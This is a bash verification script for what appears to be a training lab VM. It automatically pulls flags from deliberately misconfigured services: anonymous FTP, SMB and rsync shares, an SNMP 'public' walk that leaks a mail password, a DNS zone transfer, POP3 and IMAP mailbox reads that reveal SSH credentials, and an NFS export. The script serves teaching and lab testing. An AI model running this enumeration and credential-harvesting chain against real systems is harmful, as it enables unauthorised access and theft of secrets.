#!/usr/bin/env bash
set -euo pipefail

profile="${2:-week5}"
tmp_dir="$(mktemp -d)"
flags=()

if [[ "$profile" != week5 && "$profile" != week5_demo ]]; then
  printf '[FAIL] Profile must be week5 or week5_demo.\n' >&2
  exit 1
fi

if [[ "$profile" == week5_demo ]]; then
  host_only_ip=192.168.56.51
  file_name=internal-notes.txt
  ssh_username=demo_operator
  ssh_password='DemoSsh-Only-2026!'
  mail_username=demo_analyst
  mail_password='DemoMail-Only-2026!'
else
  host_only_ip=192.168.56.50
  file_name=flag.txt
  ssh_username=operator
  ssh_password='LlYcvWqWdJKvvnNmlruUY/bb'
  mail_username=analyst
  mail_password='MailLab-Only-2026'
fi
target="${1:-$host_only_ip}"
dns_expected_ip="${3:-$target}"

declare -A demo_keys=(
  [FTP]=DB_PASSWORD [SSH]=OPS-KEY [SMTP]=HELPDESK_PIN
  [SMB]=VPN_RECOVERY_CODE [RSYNC]=BACKUP_TOKEN [SNMP]=RACK_ACCESS_CODE
  ["DNS AXFR"]=INTERNAL_API_KEY [POP3]=HR_EXPORT_PASSWORD
  [IMAP]=FINANCE_ARCHIVE_KEY [NFS]=SERVICE_ACCOUNT_PASSWORD
)

cleanup() {
  rm -f "$tmp_dir/smb.txt" "$tmp_dir/rsync-note.txt"
  rmdir "$tmp_dir"
}
trap cleanup EXIT

if [[ ! "$target" =~ ^[0-9a-fA-F:.]+$ ]]; then
  printf '[FAIL] Target must be an IPv4 or IPv6 address.\n' >&2
  exit 1
fi
if [[ ! "$dns_expected_ip" =~ ^[0-9a-fA-F:.]+$ ]]; then
  printf '[FAIL] Expected DNS address must be an IPv4 or IPv6 address.\n' >&2
  exit 1
fi

for command in curl dig nc rsync smbclient snmpget snmpwalk showmount vagrant; do
  command -v "$command" >/dev/null || {
    printf '[FAIL] Required command is missing: %s\n' "$command" >&2
    exit 1
  }
done

check_tcp() {
  local port="$1"
  local name="$2"
  nc -z -w 3 "$target" "$port"
  printf '[OK] %s TCP/%s\n' "$name" "$port"
}

record_flag() {
  local service="$1"
  local content="$2"
  local flag
  if [[ "$profile" == week5_demo ]]; then
    flag="$(grep -Eo "${demo_keys[$service]}=demo-[A-Za-z0-9-]+" <<<"$content" | sed -n '1p')"
  else
    flag="$(grep -Eo 'WRI\{[0-9a-f]{32}\}' <<<"$content" | sed -n '1p')"
  fi
  test -n "$flag"
  flags+=("$flag")
  printf '[OK] %s evidence: %s\n' "$service" "$flag"
}

check_tcp 21 FTP
check_tcp 22 SSH
check_tcp 25 SMTP
check_tcp 53 DNS
check_tcp 110 POP3
check_tcp 139 SMB
check_tcp 143 IMAP
check_tcp 445 SMB
check_tcp 873 Rsync
check_tcp 2049 NFS

record_flag FTP "$(curl --connect-timeout 5 --max-time 15 --fail --silent "ftp://${target}/pub/${file_name}")"
record_flag SSH "$(nc -w 3 "$target" 22 || true)"
smtp_result="$(printf 'EHLO verify.wri.local\r\nQUIT\r\n' | nc -w 8 "$target" 25 || true)"
grep -q 'WRI-MAILGATE' <<<"$smtp_result"
record_flag SMTP "$smtp_result"

smbclient -N "//${target}/public" -c "get $file_name $tmp_dir/smb.txt" >/dev/null
record_flag SMB "$(<"$tmp_dir/smb.txt")"

rsync "rsync://${target}/" | grep -q '^public'
rsync "rsync://${target}/public/${file_name}" "$tmp_dir/rsync-note.txt" >/dev/null
record_flag RSYNC "$(<"$tmp_dir/rsync-note.txt")"

record_flag SNMP "$(snmpget -v2c -c public "$target" 1.3.6.1.2.1.1.6.0)"
snmp_system_info="$(snmpwalk -v2c -c public "$target")"
grep -Fq "/opt/wri-mail-lab.py --username $mail_username --password $mail_password" <<<"$snmp_system_info"
printf '[OK] Default SNMP walk exposes the valid IMAP/POP3 lab credential.\n'
dns_axfr="$(dig "@${target}" wri.local AXFR)"
grep -q 'intranet\.wri\.local\.' <<<"$dns_axfr"
record_flag 'DNS AXFR' "$(grep 'replica-catalog\.wri\.local\.' <<<"$dns_axfr")"

pop3_result="$(printf 'USER %s\r\nPASS %s\r\nRETR 2\r\nQUIT\r\n' "$mail_username" "$mail_password" | nc -w 8 "$target" 110 || true)"
record_flag POP3 "$pop3_result"
pop3_ssh_mail="$(printf 'USER %s\r\nPASS %s\r\nRETR 3\r\nQUIT\r\n' "$mail_username" "$mail_password" | nc -w 8 "$target" 110 || true)"
grep -Fq "SSH username: $ssh_username" <<<"$pop3_ssh_mail"
grep -Fq "SSH password: $ssh_password" <<<"$pop3_ssh_mail"

imap_result="$(printf 'a1 LOGIN %s %s\r\na2 SELECT INBOX\r\na3 FETCH 2 BODY[]\r\na4 LOGOUT\r\n' "$mail_username" "$mail_password" | nc -w 8 "$target" 143 || true)"
record_flag IMAP "$imap_result"
imap_ssh_mail="$(printf 'a1 LOGIN %s %s\r\na2 SELECT INBOX\r\na3 FETCH 3 BODY[]\r\na4 LOGOUT\r\n' "$mail_username" "$mail_password" | nc -w 8 "$target" 143 || true)"
grep -Fq "SSH username: $ssh_username" <<<"$imap_ssh_mail"
grep -Fq "SSH password: $ssh_password" <<<"$imap_ssh_mail"

nfs_content="$(vagrant ssh "$profile" -c \
  "mount_dir=\$(mktemp -d); sudo mount -t nfs -o ro ${target}:/srv/nfs/public \"\$mount_dir\"; cat \"\$mount_dir/${file_name}\"; sudo umount \"\$mount_dir\"; rmdir \"\$mount_dir\"" \
  2>/dev/null)"
record_flag NFS "$nfs_content"

dig +short "@${target}" target.wri.local A | grep -qx "$dns_expected_ip"
dig +short "@${target}" intranet.wri.local A | grep -qx "$dns_expected_ip"
dig +short "@${target}" -x "$host_only_ip" | grep -qx 'target.wri.local.'
if [[ "$dns_expected_ip" != "$host_only_ip" ]]; then
  dig +short "@${target}" -x "$dns_expected_ip" | grep -qx 'target.wri.local.'
fi
showmount -e "$target" | grep -q '/srv/nfs/public'

unique_count="$(printf '%s\n' "${flags[@]}" | sort -u | wc -l | tr -d ' ')"
test "$unique_count" -eq 10

if [[ "$profile" == week5_demo ]]; then
  printf '[OK] All 10 services returned distinct synthetic sensitive records.\n'
else
  printf '[OK] All 10 services returned unique deployment-specific MD5 flags.\n'
fi

if nc -z -w 3 "$target" 80; then
  printf '[FAIL] HTTP must be absent from the Week 5 target.\n' >&2
  exit 1
fi

printf '[OK] HTTP is absent from the Week 5 target.\n'
